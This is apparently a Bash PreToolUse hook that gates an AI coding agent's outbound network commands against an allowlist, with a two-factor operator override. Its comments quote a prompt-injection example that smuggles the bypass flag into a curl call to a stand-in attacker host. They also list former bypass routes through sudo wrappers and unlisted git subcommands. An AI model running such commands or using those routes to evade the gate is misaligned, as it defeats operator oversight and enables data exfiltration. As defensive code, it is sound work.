#!/usr/bin/env bash
# hooks/network-gate.sh
# PreToolUse hook — default-deny egress gate. Composes with
# `bash-denylist.sh` (RCE patterns) and `approval-gate.sh` (destructive
# ops) in the PreToolUse Bash chain: ALL hooks must allow.
#
# Spec:   docs/specs/network-egress-allowlist.md (OSS Trust A-2)
# Parent: #122
# Sibling pattern: hooks/bash-denylist.sh (same I/O contract, same
# fail-closed posture).
#
# I/O contract (Claude Code hook spec):
#   stdin:  JSON {"tool_name":"<name>","tool_input":{"command":"..."}}
#   stdout: JSON {"decision":"allow"|"block","reason":"..."}
#
# Posture (per spec D-3):
#   - Default-deny: missing or empty allowlist → every outbound call is
#     blocked.
#   - Fail-CLOSED: malformed input, missing command, missing jq, or a
#     known network CLI whose host can't be parsed → block.
#   - Two-factor bypass (spec D-6): both
#       WALTER_EGRESS_ALLOW_OVERRIDE=1 (env, operator-set)
#       AND the literal `--allow-egress-outbound` token in the command
#     must be present to override a deny. Either alone is rejected.
#
# Threat model + scope notes are in the spec. This hook ONLY inspects
# command-line strings for a known set of network CLIs; it does NOT
# intercept connection-layer traffic (that's A-3 / process-isolation).

set -uo pipefail

# Re-exec under bash 4+ if we landed on bash 3.2 (macOS default). We use
# `=~` and `read -a` which both work in 3.2 — but indexed-array growth +
# `${arr[@]}` semantics differ in subtle ways. Inherit the same re-exec
# dance bash-denylist.sh uses so this hook behaves identically.
if [[ -n "${BASH_VERSION:-}" && "${BASH_VERSION%%.*}" -lt 4 ]]; then
  if [[ "${WALTER_NETWORK_GATE_REEXEC:-0}" == "1" ]]; then
    printf '%s\n' '{"decision":"block","reason":"network-gate: re-exec landed on bash < 4 again. Install GNU bash >= 4."}'
    exit 0
  fi
  _self="${BASH_SOURCE[0]}"
  for _candidate in /opt/homebrew/bin/bash /usr/local/bin/bash; do
    if [[ -x "$_candidate" && -f "$_self" ]]; then
      WALTER_NETWORK_GATE_REEXEC=1 exec "$_candidate" "$_self" "$@"
    fi
  done
  printf '%s\n' '{"decision":"block","reason":"network-gate: requires bash >= 4.0 — install brew bash or upgrade /bin/bash."}'
  exit 0
fi

# ---------- stdin parsing ----------

INPUT="$(cat)"

if ! command -v jq >/dev/null 2>&1; then
  # Same posture as bash-denylist.sh: without jq we cannot parse the
  # hook event. Fail-closed.
  printf '%s\n' '{"decision":"block","reason":"network-gate: jq missing — failing closed for safety. Install jq to proceed."}'
  exit 0
fi

if [[ -z "$INPUT" ]]; then
  printf '%s\n' '{"decision":"block","reason":"network-gate: empty hook input — failing closed for safety."}'
  exit 0
fi

if ! TOOL_NAME="$(printf '%s' "$INPUT" | jq -er '.tool_name // empty' 2>/dev/null)"; then
  printf '%s\n' '{"decision":"block","reason":"network-gate: malformed JSON or missing tool_name — failing closed for safety."}'
  exit 0
fi

# Pass through every tool that isn't Bash. We only inspect command strings.
if [[ "$TOOL_NAME" != "Bash" ]]; then
  printf '%s\n' '{"decision":"allow"}'
  exit 0
fi

if ! CMD="$(printf '%s' "$INPUT" | jq -er '.tool_input.command // empty' 2>/dev/null)"; then
  printf '%s\n' '{"decision":"block","reason":"network-gate: cannot parse hook input (malformed JSON or missing tool_input.command) — failing closed for safety."}'
  exit 0
fi
if [[ -z "$CMD" ]]; then
  printf '%s\n' '{"decision":"block","reason":"network-gate: empty Bash command — failing closed for safety."}'
  exit 0
fi

# ---------- bypass detection ----------

# Spec D-6: BOTH env + flag must be present.
#
# R2 refinement: the flag must appear as a SPACE-BRACKETED token in the
# command (preceded by start-of-string or whitespace AND followed by
# end-of-string or whitespace). This blocks the prompt-injection pattern
# `curl -d '{"x":"--allow-egress-outbound"}' https://evil.example` from
# triggering the bypass — the embedded form is bracketed by `"` not
# whitespace, so the pattern doesn't match. `grep -w` was too loose
# (treats `"` as a word boundary, which still matches the embedded form).
#
# Caveat: this catches the common bypass-via-JSON-body case but does NOT
# distinguish a real shell token from a single-quoted string literal
# like `curl '... --allow-egress-outbound ...'`. Full shell-token
# parsing would require porting a shellword splitter into the hook,
# which is out of scope for v0.5.x. The two-factor design assumes the
# operator who exported `WALTER_EGRESS_ALLOW_OVERRIDE=1` is reviewing
# the command they typed; that env var is the real gate.
_has_bypass_flag() {
  echo "$1" | grep -qE -- '(^|[[:space:]])--allow-egress-outbound([[:space:]]|$)'
}

_two_factor_bypass_active() {
  [[ "${WALTER_EGRESS_ALLOW_OVERRIDE:-0}" == "1" ]] && _has_bypass_flag "$CMD"
}

# ---------- network CLI detection ----------

# Returns 0 if the command appears to invoke a network CLI we recognize.
# The detection looks at the FIRST tokens of the command and at any
# segment after a `;`, `&&`, `||`, `|`, or `&` separator — because chained
# commands like `cd foo && curl X` still need inspecting.
#
# `git` is a network CLI only for a known subcommand allowlist
# (clone/fetch/pull/push/ls-remote/submodule/archive/remote/cherry); all
# other subcommands (status, log, diff, add, commit, rev-parse, config,
# ...) are LOCAL and pass through.

# Output helper.
_emit_allow() {
  printf '%s\n' '{"decision":"allow"}'
  exit 0
}
_emit_block() {
  local reason="$1"
  printf '{"decision":"block","reason":%s}\n' "$(jq -n --arg r "$reason" '$r')"
  exit 0
}
_emit_allow_with_warn() {
  local msg="$1"
  printf '{"decision":"allow","systemMessage":%s}\n' "$(jq -n --arg m "$msg" '$m')"
  exit 0
}

# Split the command into segments by shell separators (`;`, `&&`, `||`,
# `|`, `&`). We then inspect each segment as if it were its own command.
# Using `sed` to insert NEWLINE markers + reading line by line is the
# portable way to do this in bash 3.2.
_split_segments() {
  printf '%s\n' "$1" \
    | sed -E -e 's/&&/\n/g' -e 's/\|\|/\n/g' -e 's/;/\n/g' -e 's/\|/\n/g' -e 's/[[:space:]]&[[:space:]]/\n/g'
}

# Return the first non-flag positional argument from a tokenized arg list.
# Used by ssh / nc.
_first_positional() {
  local arg
  for arg in "$@"; do
    case "$arg" in
      -*) ;;  # skip flags
      *)  printf '%s\n' "$arg"; return 0 ;;
    esac
  done
  return 1
}

# Extract DNS-host from a URL string `scheme://[user[:pass]@]host[:port][/...]`.
# Returns empty on no match. Uses bash regex.
#
# IPv6 literals MUST be enclosed in brackets in a URL (RFC 3986):
#   http://[::1]/path → host = [::1]
#   http://[fd00::1]:8080/api → host = [fd00::1]
# We extract the bracketed form FIRST, then fall through to the IPv4 /
# DNS-name regex. R2 (W1) finding — previously the `[` character was
# returned as the "host" for IPv6 URLs which then failed CLI validation
# with a cryptic message. The brackets are kept as part of the extracted
# host so the allowlist entry can be written verbatim (`[::1]`,
# `[fd00::1]`) — `_egress_validate_host` permits brackets for this case.
_host_from_url() {
  local url="$1"
  # IPv6 literal first: scheme://[...]
  if [[ "$url" =~ ^[a-zA-Z][a-zA-Z0-9+.-]*://([^/@[:space:]]+@)?(\[[0-9a-fA-F:]+\]) ]]; then
    printf '%s\n' "${BASH_REMATCH[2]}"
    return 0
  fi
  # IPv4 / DNS hostname.
  if [[ "$url" =~ ^[a-zA-Z][a-zA-Z0-9+.-]*://([^/@[:space:]]+@)?([^/:[:space:]]+) ]]; then
    printf '%s\n' "${BASH_REMATCH[2]}"
    return 0
  fi
  return 1
}

# Extract host from `user@host:path` (git/scp/rsync ssh form).
_host_from_userhostpath() {
  local s="$1"
  if [[ "$s" =~ ^([^@[:space:]]+)@([^:[:space:]]+): ]]; then
    printf '%s\n' "${BASH_REMATCH[2]}"
    return 0
  fi
  return 1
}

# Extract bare host from `host:path` (rsync — no user).
_host_from_hostpath() {
  local s="$1"
  if [[ "$s" =~ ^([A-Za-z0-9][A-Za-z0-9.-]*):[^/] ]]; then
    printf '%s\n' "${BASH_REMATCH[1]}"
    return 0
  fi
  return 1
}

# Extract host from `[user@]host` (bare ssh target).
_host_from_userhost() {
  local s="$1"
  if [[ "$s" =~ ^([^@[:space:]]+)@([A-Za-z0-9][A-Za-z0-9.-]*)$ ]]; then
    printf '%s\n' "${BASH_REMATCH[2]}"
    return 0
  fi
  if [[ "$s" =~ ^([A-Za-z0-9][A-Za-z0-9.-]*)$ ]]; then
    printf '%s\n' "${BASH_REMATCH[1]}"
    return 0
  fi
  return 1
}

# Load the loader function.
# shellcheck disable=SC1090,SC1091
_loader_path="${WALTER_OS_HOME:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}/scripts/walter/lib/egress-loader.sh"
if [[ ! -f "$_loader_path" ]]; then
  _emit_block "network-gate: egress-loader.sh missing at $_loader_path — failing closed."
fi
# shellcheck disable=SC1090
source "$_loader_path"

# Inspect a single shell segment. Detects the CLI + extracts the host(s).
# Returns:
#   0 + STDOUT "ALLOW"           → segment is allowed (no network CLI OR allowlisted)
#   0 + STDOUT "BLOCK: <reason>" → segment is blocked
#
# We collect ALL hosts seen and require ALL of them be allowlisted; the
# first non-allowed one blocks.
_inspect_segment() {
  local seg="$1"
  # Trim leading whitespace
  seg="${seg#"${seg%%[![:space:]]*}"}"
  [[ -z "$seg" ]] && { echo "ALLOW"; return 0; }

  # Tokenize. read -ra splits on $IFS (default whitespace) and respects
  # backslash escapes. We don't try to honour shell quoting here — the
  # parser is intentionally pessimistic: a quoted URL is treated like an
  # unquoted one, which means we MAY parse hosts out of strings inside
  # quotes. For an ALLOWLIST, false-positive host detection is safer
  # than false-negative (an unparsed host means we silently allow).
  local -a tokens
  read -ra tokens <<< "$seg"
  local cli="${tokens[0]:-}"

  # Strip leading command wrappers + their flags / value-pairs / VAR=val
  # assignments so `sudo -E curl X`, `sudo -u nobody curl X`, `env FOO=bar
  # curl X`, `/usr/bin/env curl X` etc. still resolve to `curl`.
  #
  # Wrappers handled:  sudo, env, nice, nohup, time, stdbuf, setsid,
  #                    chrt, taskset, ionice
  # Value-taking flags for these: sudo -u/-g/-h/-r/-t/-T/-D/-A, env -u/-C.
  # We're conservative: strip 2-token (-X val) form when we recognize
  # the flag; otherwise strip just the flag.
  #
  # R2 finding (B1): without this, `sudo -E curl https://evil.example`
  # silently passed because `-E` wasn't a known CLI → fell to `*) allow`.
  local _strip_more=1
  while [[ "$_strip_more" -eq 1 ]]; do
    _strip_more=0
    case "${cli##*/}" in
      sudo|env|nice|nohup|time|stdbuf|setsid|chrt|taskset|ionice)
        # Drop the wrapper itself.
        tokens=("${tokens[@]:1}")
        # Eat any flags, optional flag values, and VAR=val assignments.
        while [[ ${#tokens[@]} -gt 0 ]]; do
          case "${tokens[0]}" in
            # Value-taking flags (sudo + env): consume the next token too.
            -u|-g|-h|-r|-t|-T|-D|-A|-C|-N|-S)
              tokens=("${tokens[@]:2}") ;;
            # Any other short or long flag: just drop the flag.
            -*)
              tokens=("${tokens[@]:1}") ;;
            # VAR=value (env-style assignment).
            *=*)
              tokens=("${tokens[@]:1}") ;;
            *)
              break ;;
          esac
        done
        cli="${tokens[0]:-}"
        _strip_more=1
        ;;
    esac
  done

  # Strip absolute paths: /usr/bin/curl → curl.
  cli="${cli##*/}"

  # After unwrapping, if the resulting CLI looks suspicious (empty, a
  # leftover flag, or still a VAR=val) we cannot make a safe decision.
  # Fail-CLOSED rather than fall through to the catch-all `*) allow`
  # branch (R2 finding).
  if [[ -z "$cli" || "${cli:0:1}" == "-" || "$cli" == *=* ]]; then
    echo "BLOCK: network-gate: unable to identify the network CLI after stripping wrappers (sudo/env/...). Failing closed. Original segment: ${seg}"
    return 0
  fi

  case "$cli" in
    curl|wget)
      # Extract every URL-like token.
      local found=0 t host
      for t in "${tokens[@]:1}"; do
        if host="$(_host_from_url "$t")" && [[ -n "$host" ]]; then
          found=1
          if ! walter_egress_host_allowed "$host"; then
            echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via '$cli'). Add via: walter-os egress add '$host'"
            return 0
          fi
        fi
      done
      if [[ "$found" -eq 0 ]]; then
        echo "BLOCK: network-gate: '$cli' invoked without an extractable URL host (e.g. '$cli --help'). Run that command outside the agent OR pass a full URL."
        return 0
      fi
      echo "ALLOW"
      return 0
      ;;
    gh)
      # gh's default host is github.com unless GH_HOST is set. We use
      # whichever is configured.
      local gh_host="${GH_HOST:-github.com}"
      if ! walter_egress_host_allowed "$gh_host"; then
        echo "BLOCK: network-gate: '$gh_host' (gh default host) not in egress allowlist. Add via: walter-os egress add '$gh_host'"
        return 0
      fi
      echo "ALLOW"
      return 0
      ;;
    git)
      # Inspect subcommands that touch the network.
      #
      # R2 fixes:
      #   - REMOVED `cherry` (B4) — `git cherry` is local-only (compares
      #     local commits against upstream by reading local refs).
      #   - ADDED `lfs|svn|annex|p4|bundle|send-email` (B5) — these git
      #     extensions DO touch the network and were previously falling
      #     through to the catch-all `*) allow` branch, fully bypassing
      #     the gate.
      #   - `remote` is kept LOCAL-by-default; `git remote -v` and
      #     `git remote add` don't hit the network. The network-touching
      #     `remote update` / `remote show` / `remote prune` subcommands
      #     are rare in agent workflows. If an operator hits one of those
      #     and needs the gate to cover it, they can run with the
      #     two-factor bypass. (Out-of-scope refinement for v0.5.x.)
      local sub="${tokens[1]:-}"
      case "$sub" in
        clone|fetch|pull|push|ls-remote|submodule|fetch-pack|send-pack|http-fetch|http-push|imap-send|upload-pack|upload-archive|receive-pack|bundle|send-email|lfs|svn|annex|p4|cvsimport|cvsexportcommit)
          local t host found=0
          for t in "${tokens[@]:2}"; do
            if host="$(_host_from_url "$t")" && [[ -n "$host" ]]; then
              found=1
            elif host="$(_host_from_userhostpath "$t")" && [[ -n "$host" ]]; then
              found=1
            else
              continue
            fi
            if ! walter_egress_host_allowed "$host"; then
              echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via 'git $sub'). Add via: walter-os egress add '$host'"
              return 0
            fi
          done
          if [[ "$found" -eq 0 ]]; then
            # `git fetch` with no explicit remote uses the configured
            # upstream — implicit host. Fail-CLOSED per spec. Same for
            # `git lfs push` etc. without an explicit remote.
            echo "BLOCK: network-gate: 'git $sub' uses an implicit remote (no URL on the command line). Pass the remote URL explicitly OR allowlist the configured remote's host with WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound."
            return 0
          fi
          echo "ALLOW"
          return 0
          ;;
        archive)
          # `git archive` is local by default but `--remote=URL` makes it
          # network. If --remote is present, require URL extraction;
          # otherwise pass through.
          local t found_remote=0
          for t in "${tokens[@]:2}"; do
            case "$t" in --remote=*|--remote) found_remote=1; break ;; esac
          done
          if [[ "$found_remote" -eq 1 ]]; then
            local found=0 host
            for t in "${tokens[@]:2}"; do
              # --remote=URL form
              if [[ "$t" == --remote=* ]]; then
                if host="$(_host_from_url "${t#--remote=}")" && [[ -n "$host" ]]; then
                  found=1
                  walter_egress_host_allowed "$host" || {
                    echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via 'git archive --remote=')."; return 0;
                  }
                fi
              fi
            done
            if [[ "$found" -eq 0 ]]; then
              echo "BLOCK: network-gate: 'git archive --remote=' present but URL host could not be extracted. Failing closed."
              return 0
            fi
          fi
          echo "ALLOW"
          return 0
          ;;
        *)
          # Local-only git operation (status, log, diff, add, commit,
          # cherry, branch, tag, stash, reset, rebase, …).
          echo "ALLOW"
          return 0
          ;;
      esac
      ;;
    ssh)
      # Target is the first non-flag positional. ssh has flag args that
      # take values (`-i keyfile`, `-p port`, `-o opt=val`, …) — skip
      # both flag + value to avoid mistaking the value for the host.
      local i=1 target=""
      while [[ $i -lt ${#tokens[@]} ]]; do
        local tok="${tokens[$i]}"
        case "$tok" in
          -i|-p|-o|-l|-F|-J|-L|-R|-D|-B|-b|-c|-E|-e|-I|-m|-O|-Q|-S|-W|-w)
            i=$((i + 2)); continue ;;
          -*)
            i=$((i + 1)); continue ;;
          *)
            target="$tok"; break ;;
        esac
      done
      if [[ -z "$target" ]]; then
        echo "BLOCK: network-gate: 'ssh' invoked without a target host."
        return 0
      fi
      local host
      host="$(_host_from_userhost "$target")" || host=""
      if [[ -z "$host" ]]; then
        echo "BLOCK: network-gate: 'ssh' target not parseable: $target"
        return 0
      fi
      if ! walter_egress_host_allowed "$host"; then
        echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via 'ssh'). Add via: walter-os egress add '$host'"
        return 0
      fi
      echo "ALLOW"
      return 0
      ;;
    scp|rsync)
      # Look for the first token that contains `user@host:` OR `host:`
      # (with `:` followed by a non-`/`, to distinguish from
      # Windows-style or local paths).
      local t host found=0
      for t in "${tokens[@]:1}"; do
        if host="$(_host_from_userhostpath "$t")" && [[ -n "$host" ]]; then
          found=1
        elif host="$(_host_from_hostpath "$t")" && [[ -n "$host" ]]; then
          found=1
        elif host="$(_host_from_url "$t")" && [[ -n "$host" ]]; then
          # rsync://host/module form
          found=1
        else
          continue
        fi
        if ! walter_egress_host_allowed "$host"; then
          echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via '$cli'). Add via: walter-os egress add '$host'"
          return 0
        fi
      done
      if [[ "$found" -eq 0 ]]; then
        echo "BLOCK: network-gate: '$cli' invoked without an extractable host (no user@host:path / rsync:// URL on the command line)."
        return 0
      fi
      echo "ALLOW"
      return 0
      ;;
    nc|ncat|netcat)
      # First non-flag positional is the host.
      local target
      target="$(_first_positional "${tokens[@]:1}")" || target=""
      if [[ -z "$target" ]]; then
        echo "BLOCK: network-gate: '$cli' invoked without a target host."
        return 0
      fi
      if ! walter_egress_host_allowed "$target"; then
        echo "BLOCK: network-gate: '$target' not in egress allowlist (matched via '$cli'). Add via: walter-os egress add '$target'"
        return 0
      fi
      echo "ALLOW"
      return 0
      ;;
    pip|pip3|npm|pnpm|yarn|uv|uvx|cargo|brew|gem|go)
      # These read host config from environment / config files. Per spec
      # AC-2, fail-CLOSED on implicit host.
      #
      # An OPERATOR who explicitly passes `--index-url` / `--registry` /
      # equivalent can extract a parseable host — we honour that. The
      # absence of any URL token in the command line is the trigger to
      # block.
      local t host found=0
      for t in "${tokens[@]:1}"; do
        if host="$(_host_from_url "$t")" && [[ -n "$host" ]]; then
          found=1
          if ! walter_egress_host_allowed "$host"; then
            echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via '$cli'). Add via: walter-os egress add '$host'"
            return 0
          fi
        fi
      done
      if [[ "$found" -eq 0 ]]; then
        echo "BLOCK: network-gate: '$cli' uses an implicit host (config/env). Explicitly pass --index-url / --registry / equivalent host argument, OR allowlist the default host and re-run with WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound."
        return 0
      fi
      echo "ALLOW"
      return 0
      ;;
    *)
      # Unknown / not a network CLI — pass.
      echo "ALLOW"
      return 0
      ;;
  esac
}

# Two-factor bypass: if both signals present, allow with WARN and exit.
if _two_factor_bypass_active; then
  _emit_allow_with_warn "network-gate: two-factor bypass active (WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound). Command allowed with operator acknowledgment."
fi

# Inspect each segment. First BLOCK wins.
while IFS= read -r _segment; do
  [[ -z "${_segment// }" ]] && continue
  result="$(_inspect_segment "$_segment")"
  case "$result" in
    ALLOW) ;;
    BLOCK:\ *)
      _emit_block "${result#BLOCK: }" ;;
    *)
      # Inspector returned something unexpected — fail-CLOSED.
      _emit_block "network-gate: unexpected inspector output: $result" ;;
  esac
done < <(_split_segments "$CMD")

_emit_allow
